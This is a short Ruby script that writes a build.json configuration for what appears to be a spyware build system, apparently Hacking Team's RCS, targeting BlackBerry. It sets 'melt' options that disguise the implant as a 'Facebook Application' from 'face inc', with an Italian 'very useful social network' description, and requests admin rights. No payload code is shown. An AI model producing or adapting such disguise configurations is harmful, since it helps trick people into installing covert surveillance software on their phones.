#!/usr/bin/env ruby

require 'json'

params = {platform: 'blackberry',
          factory: {ident: 'RCS_0000000001'},
          binary: {demo: true},
          melt: {admin: true,
                 jadname: 'facebook',
                 name: 'Facebook Application',
                 desc: 'Applicazione utilissima di social network',
                 vendor: 'face inc',
                 version: '1.2.3'}
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
